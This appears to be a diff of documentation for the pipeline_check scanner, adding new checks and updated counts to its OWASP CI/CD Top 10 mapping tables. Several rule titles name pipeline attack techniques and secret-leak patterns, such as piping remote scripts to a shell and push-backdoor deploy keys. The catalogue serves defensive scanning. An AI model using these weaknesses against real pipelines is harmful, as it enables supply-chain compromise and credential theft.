@@ -19,7 +19,7 @@ Kubernetes, …) when an audit asks for that framework's vocabulary.
 
 - **Controls in this standard:** 10
 - **Controls evidenced by at least one check:** 10 / 10
-- **Distinct checks evidencing this standard:** 485
+- **Distinct checks evidencing this standard:** 509
 - **Of those, autofixable with `--fix`:** 111
 
 ## How to read severity
@@ -40,16 +40,16 @@ Click a control ID to jump to the per-control section with the full check list. 
 
 | Control | Title | Checks | Severity mix |
 |---------|-------|-------:|--------------|
-| [`CICD-SEC-1`](#ctrl-cicd-sec-1) | Insufficient Flow Control Mechanisms | 47 | 2C · 23H · 20M · 2L |
-| [`CICD-SEC-2`](#ctrl-cicd-sec-2) | Inadequate Identity and Access Management | 30 | 2C · 17H · 10M · 1L |
-| [`CICD-SEC-3`](#ctrl-cicd-sec-3) | Dependency Chain Abuse | 125 | 1C · 64H · 46M · 14L |
-| [`CICD-SEC-4`](#ctrl-cicd-sec-4) | Poisoned Pipeline Execution | 72 | 20C · 40H · 10M · 2L |
-| [`CICD-SEC-5`](#ctrl-cicd-sec-5) | Insufficient PBAC | 21 | 3C · 13H · 5M |
-| [`CICD-SEC-6`](#ctrl-cicd-sec-6) | Insufficient Credential Hygiene | 57 | 25C · 18H · 14M |
-| [`CICD-SEC-7`](#ctrl-cicd-sec-7) | Insecure System Configuration | 87 | 22C · 27H · 31M · 7L |
-| [`CICD-SEC-8`](#ctrl-cicd-sec-8) | Ungoverned Usage of 3rd-Party Services | 8 | 4C · 2H · 2M |
-| [`CICD-SEC-9`](#ctrl-cicd-sec-9) | Improper Artifact Integrity Validation | 62 | 1C · 12H · 43M · 6L |
-| [`CICD-SEC-10`](#ctrl-cicd-sec-10) | Insufficient Logging and Visibility | 42 | 3H · 12M · 11L · 16I |
+| [`CICD-SEC-1`](#ctrl-cicd-sec-1) | Insufficient Flow Control Mechanisms | 52 | 3C · 26H · 21M · 2L |
+| [`CICD-SEC-2`](#ctrl-cicd-sec-2) | Inadequate Identity and Access Management | 34 | 3C · 20H · 10M · 1L |
+| [`CICD-SEC-3`](#ctrl-cicd-sec-3) | Dependency Chain Abuse | 135 | 2C · 68H · 50M · 15L |
+| [`CICD-SEC-4`](#ctrl-cicd-sec-4) | Poisoned Pipeline Execution | 76 | 21C · 42H · 11M · 2L |
+| [`CICD-SEC-5`](#ctrl-cicd-sec-5) | Insufficient PBAC | 24 | 4C · 15H · 5M |
+| [`CICD-SEC-6`](#ctrl-cicd-sec-6) | Insufficient Credential Hygiene | 62 | 26C · 22H · 14M |
+| [`CICD-SEC-7`](#ctrl-cicd-sec-7) | Insecure System Configuration | 91 | 22C · 30H · 32M · 7L |
+| [`CICD-SEC-8`](#ctrl-cicd-sec-8) | Ungoverned Usage of 3rd-Party Services | 18 | 5C · 8H · 5M |
+| [`CICD-SEC-9`](#ctrl-cicd-sec-9) | Improper Artifact Integrity Validation | 66 | 1C · 13H · 45M · 7L |
+| [`CICD-SEC-10`](#ctrl-cicd-sec-10) | Insufficient Logging and Visibility | 43 | 3H · 12M · 12L · 16I |
 
 ## Filter at runtime
 
@@ -72,7 +72,7 @@ pipeline_check --pipeline aws --standard owasp_cicd_top_10 --standard nist_ssdf
 
 Reviews, approvals, branch protection, and deployment gates are the brakes on the pipeline. Missing them lets a single commit, or a single API call, ship straight to production.
 
-**Evidenced by 47 checks** across 12 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Drone CI, GitHub Actions, GitLab CI, Jenkins, SCM, Tekton).
+**Evidenced by 52 checks** across 12 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Drone CI, GitHub Actions, GitLab CI, Jenkins, SCM, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -95,6 +95,8 @@ Reviews, approvals, branch protection, and deployment gates are the brakes on th
 | [`DR-009`](#detail-dr-009) | Cache plugin key embeds an attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
 | [`DR-011`](#detail-dr-011) | node map interpolates attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
 | [`GHA-014`](#detail-gha-014) | Deploy job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
+| [`GHA-048`](#detail-gha-048) | Workflow step writes a file under .github/workflows/ | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-049`](#detail-gha-049) | Workflow step pushes to a repo outside the current owner | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GL-004`](#detail-gl-004) | Deploy job lacks manual approval or environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-029`](#detail-gl-029) | Manual deploy job defaults to allow_failure: true | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-033`](#detail-gl-033) | Global before_script / after_script propagates taint to every job | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
@@ -114,6 +116,9 @@ Reviews, approvals, branch protection, and deployment gates are the brakes on th
 | [`SCM-017`](#detail-scm-017) | Repository has no CODEOWNERS file | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
 | [`SCM-018`](#detail-scm-018) | Required PR reviews can be bypassed by named identities | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
 | [`SCM-019`](#detail-scm-019) | Push restrictions allowlist names individual users | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
+| [`SCM-021`](#detail-scm-021) | Actions can approve pull requests (self-approval bypass) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
+| [`SCM-023`](#detail-scm-023) | Deployment environment lacks required-reviewer protection | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
+| [`SCM-024`](#detail-scm-024) | Deployment environment can deploy from any branch | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
 | [`TAINT-001`](#detail-taint-001) | Untrusted input flows across step boundaries via step outputs | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`TAINT-002`](#detail-taint-002) | Untrusted input flows across jobs via ``jobs.<id>.outputs:`` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`TAINT-003`](#detail-taint-003) | Untrusted input forwarded into reusable workflow ``with:`` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
@@ -128,7 +133,7 @@ Reviews, approvals, branch protection, and deployment gates are the brakes on th
 
 Long-lived static credentials, shared service accounts, and human identities reused for automation collapse the blast radius of a single compromise to the whole pipeline.
 
-**Evidenced by 30 checks** across 12 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Kubernetes, OCI manifest, Tekton).
+**Evidenced by 34 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Kubernetes, OCI manifest, SCM, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -144,6 +149,7 @@ Long-lived static credentials, shared service accounts, and human identities reu
 | [`GCB-020`](#detail-gcb-020) | serviceAccount points at the default Cloud Build service account | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
 | [`GHA-030`](#detail-gha-030) | OIDC token requested without environment-protected job | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-034`](#detail-gha-034) | Reusable workflow called with secrets: inherit | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
+| [`GHA-050`](#detail-gha-050) | Publish step relies on long-lived registry token | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GL-031`](#detail-gl-031) | id_tokens: missing audience pin or environment binding | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`IAM-001`](#detail-iam-001) | CI/CD role has AdministratorAccess policy attached | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
 | [`IAM-002`](#detail-iam-002) | CI/CD role has wildcard Action in attached policy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
@@ -160,14 +166,17 @@ Long-lived static credentials, shared service accounts, and human identities reu
 | [`K8S-025`](#detail-k8s-025) | System priority class used outside kube-system | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`K8S-029`](#detail-k8s-029) | RoleBinding grants permissions to the default ServiceAccount | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`K8S-034`](#detail-k8s-034) | ServiceAccount automountServiceAccountToken not explicitly false | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
+| [`K8S-042`](#detail-k8s-042) | RoleBinding grants access to system:anonymous / system:unauthenticated | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`KMS-002`](#detail-kms-002) | KMS key policy grants wildcard KMS actions | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
+| [`SCM-020`](#detail-scm-020) | Default workflow GITHUB_TOKEN has write permission | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
+| [`SCM-025`](#detail-scm-025) | Repo has write-enabled deploy keys (push backdoor) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
 | [`TKN-007`](#detail-tkn-007) | Tekton run uses the default ServiceAccount | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
 
 ### CICD-SEC-3: Dependency Chain Abuse { #ctrl-cicd-sec-3 }
 
 Floating tags, range constraints, and unverified registries let an upstream maintainer compromise (or a typosquat) execute in your build the next time the dependency resolves.
 
-**Evidenced by 125 checks** across 17 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, OCI manifest, SCM, Tekton).
+**Evidenced by 135 checks** across 17 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, OCI manifest, SCM, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -189,6 +198,10 @@ Floating tags, range constraints, and unverified registries let an upstream main
 | [`ATTEST-001`](#detail-attest-001) | SLSA provenance attests an untrusted builder identity | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`ATTEST-002`](#detail-attest-002) | SLSA provenance source-repo claim is missing or unverifiable | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`ATTEST-003`](#detail-attest-003) | SBOM contains floating-version dependencies | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-004`](#detail-attest-004) | SLSA provenance ships without a resolved-dependencies set | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-005`](#detail-attest-005) | In-toto Statement subject is missing or unpinned | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-006`](#detail-attest-006) | SLSA provenance lacks a meaningful buildType | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-007`](#detail-attest-007) | SBOM packages lack supplier / originator attribution | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
 | [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`BB-009`](#detail-bb-009) | pipe: pinned by version rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`BB-012`](#detail-bb-012) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
@@ -221,6 +234,10 @@ Floating tags, range constraints, and unverified registries let an upstream main
 | [`DF-009`](#detail-df-009) | ADD used where COPY would suffice | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
 | [`DF-010`](#detail-df-010) | apt-get dist-upgrade / upgrade pulls unknown package versions | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
 | [`DF-016`](#detail-df-016) | Image lacks OCI provenance labels | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
+| [`DF-021`](#detail-df-021) | RUN pip install bypasses TLS or uses an HTTP index | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
+| [`DF-022`](#detail-df-022) | RUN uses npm install instead of npm ci | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
+| [`DF-024`](#detail-df-024) | RUN npm/yarn/pnpm install runs lifecycle scripts | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
+| [`DF-025`](#detail-df-025) | RUN writes a registry auth token into a Docker layer | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
 | [`DR-001`](#detail-dr-001) | Step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
 | [`DR-005`](#detail-dr-005) | Plugin step uses a floating image tag | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
 | [`DR-006`](#detail-dr-006) | TLS verification disabled in step commands | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
@@ -282,6 +299,7 @@ Floating tags, range constraints, and unverified registries let an upstream main
 | [`JF-022`](#detail-jf-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`JF-023`](#detail-jf-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`JF-031`](#detail-jf-031) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
+| [`JF-035`](#detail-jf-035) | httpRequest step disables SSL verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
 | [`K8S-001`](#detail-k8s-001) | Container image not pinned by sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`K8S-036`](#detail-k8s-036) | ServiceAccount imagePullSecrets references missing Secret | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`OCI-001`](#detail-oci-001) | Image manifest is missing OCI provenance annotations | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
@@ -293,6 +311,7 @@ Floating tags, range constraints, and unverified registries let an upstream main
 | [`OCI-007`](#detail-oci-007) | Image manifest uses legacy schemaVersion 1 (no content addressing) | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`OCI-008`](#detail-oci-008) | Manifest references digest using unsupported hash algorithm | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
+| [`SCM-022`](#detail-scm-022) | Repo Actions permissions allow any source (no allow-list) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
 | [`TKN-001`](#detail-tkn-001) | Tekton step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
 | [`TKN-008`](#detail-tkn-008) | Tekton step script pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`TKN-014`](#detail-tkn-014) | Tekton step script runs unpinned package install | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
@@ -301,7 +320,7 @@ Floating tags, range constraints, and unverified registries let an upstream main
 
 An attacker who can influence what a build runs, via a PR, an issue comment, or a tainted environment variable, executes with the build's secrets and write-access to your artifacts.
 
-**Evidenced by 72 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Tekton).
+**Evidenced by 76 checks** across 14 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, SCM, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -354,6 +373,8 @@ An attacker who can influence what a build runs, via a PR, an issue comment, or 
 | [`GHA-044`](#detail-gha-044) | Build tool runs lifecycle scripts on untrusted-trigger workflow | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-045`](#detail-gha-045) | Caller-controlled ref input feeds actions/checkout | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-046`](#detail-gha-046) | Manual PR-head fetch on untrusted-trigger workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-048`](#detail-gha-048) | Workflow step writes a file under .github/workflows/ | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-049`](#detail-gha-049) | Workflow step pushes to a repo outside the current owner | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GL-002`](#detail-gl-002) | Script injection via untrusted commit/MR context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-010`](#detail-gl-010) | Multi-project pipeline ingests upstream artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-011`](#detail-gl-011) | include: local file pulled in MR-triggered pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
@@ -367,6 +388,8 @@ An attacker who can influence what a build runs, via a PR, an issue comment, or 
 | [`JF-026`](#detail-jf-026) | `build job:` trigger ignores downstream failure | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
 | [`JF-029`](#detail-jf-029) | Jenkinsfile contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
 | [`JF-030`](#detail-jf-030) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
+| [`SCM-021`](#detail-scm-021) | Actions can approve pull requests (self-approval bypass) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
+| [`SCM-024`](#detail-scm-024) | Deployment environment can deploy from any branch | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
 | [`TAINT-001`](#detail-taint-001) | Untrusted input flows across step boundaries via step outputs | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`TAINT-002`](#detail-taint-002) | Untrusted input flows across jobs via ``jobs.<id>.outputs:`` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`TAINT-003`](#detail-taint-003) | Untrusted input forwarded into reusable workflow ``with:`` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
@@ -382,7 +405,7 @@ An attacker who can influence what a build runs, via a PR, an issue comment, or 
 
 Build steps with deploy-class permissions, jobs sharing a single broad role, and missing environment gates each let a routine compromise escalate from build to production.
 
-**Evidenced by 21 checks** across 9 providers (AWS, Argo Workflows, Buildkite, CircleCI, Drone CI, GitHub Actions, Jenkins, Kubernetes, Tekton).
+**Evidenced by 24 checks** across 10 providers (AWS, Argo Workflows, Buildkite, CircleCI, Drone CI, GitHub Actions, Jenkins, Kubernetes, SCM, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -399,10 +422,13 @@ Build steps with deploy-class permissions, jobs sharing a single broad role, and
 | [`K8S-021`](#detail-k8s-021) | Role or ClusterRole grants wildcard verbs+resources | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`K8S-025`](#detail-k8s-025) | System priority class used outside kube-system | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`K8S-029`](#detail-k8s-029) | RoleBinding grants permissions to the default ServiceAccount | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
+| [`K8S-042`](#detail-k8s-042) | RoleBinding grants access to system:anonymous / system:unauthenticated | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`PBAC-001`](#detail-pbac-001) | CodeBuild project has no VPC configuration | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
 | [`PBAC-002`](#detail-pbac-002) | CodeBuild service role shared across multiple projects | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
 | [`PBAC-003`](#detail-pbac-003) | CodeBuild security group allows 0.0.0.0/0 all-port egress | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
 | [`PBAC-005`](#detail-pbac-005) | CodePipeline stage action roles mirror the pipeline role | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
+| [`SCM-020`](#detail-scm-020) | Default workflow GITHUB_TOKEN has write permission | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
+| [`SCM-023`](#detail-scm-023) | Deployment environment lacks required-reviewer protection | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
 | [`TKN-002`](#detail-tkn-002) | Tekton step runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
 | [`TKN-004`](#detail-tkn-004) | Tekton Task mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |
 | [`TKN-013`](#detail-tkn-013) | Tekton sidecar runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
@@ -412,7 +438,7 @@ Build steps with deploy-class permissions, jobs sharing a single broad role, and
 
 Plaintext secrets in YAML, env vars baked into image layers, or tokens echoed to logs all leak credentials before they're ever exploited; rotation only helps if the leak is detected.
 
-**Evidenced by 57 checks** across 17 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM, Tekton, Terraform).
+**Evidenced by 62 checks** across 17 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM, Tekton, Terraform).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -439,6 +465,7 @@ Plaintext secrets in YAML, env vars baked into image layers, or tokens echoed to
 | [`DF-006`](#detail-df-006) | ENV or ARG carries a credential-shaped literal value | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
 | [`DF-019`](#detail-df-019) | COPY/ADD source path looks like a credential file | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`DF-020`](#detail-df-020) | ARG declares a credential-named build argument | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
+| [`DF-025`](#detail-df-025) | RUN writes a registry auth token into a Docker layer | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
 | [`DR-004`](#detail-dr-004) | Literal credential in step environment / settings | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Drone CI](../providers/drone.md) |  |
 | [`GCB-003`](#detail-gcb-003) | Secret Manager value referenced in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
 | [`GCB-007`](#detail-gcb-007) | availableSecrets references ``versions/latest`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
@@ -451,6 +478,7 @@ Plaintext secrets in YAML, env vars baked into image layers, or tokens echoed to
 | [`GHA-034`](#detail-gha-034) | Reusable workflow called with secrets: inherit | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`GHA-037`](#detail-gha-037) | actions/checkout persists GITHUB_TOKEN into .git/config | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-039`](#detail-gha-039) | services / container credentials embedded as literal in workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-050`](#detail-gha-050) | Publish step relies on long-lived registry token | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GL-003`](#detail-gl-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-008`](#detail-gl-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`GL-013`](#detail-gl-013) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
@@ -459,6 +487,8 @@ Plaintext secrets in YAML, env vars baked into image layers, or tokens echoed to
 | [`JF-004`](#detail-jf-004) | AWS auth uses long-lived access keys via withCredentials | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`JF-008`](#detail-jf-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`JF-010`](#detail-jf-010) | Long-lived AWS keys exposed via environment {} block | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
+| [`JF-033`](#detail-jf-033) | withCredentials secret leaked via Groovy ${...} interpolation in sh step | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
+| [`JF-034`](#detail-jf-034) | Pipeline declares a password() build parameter | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
 | [`K8S-012`](#detail-k8s-012) | Pod automountServiceAccountToken not false | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
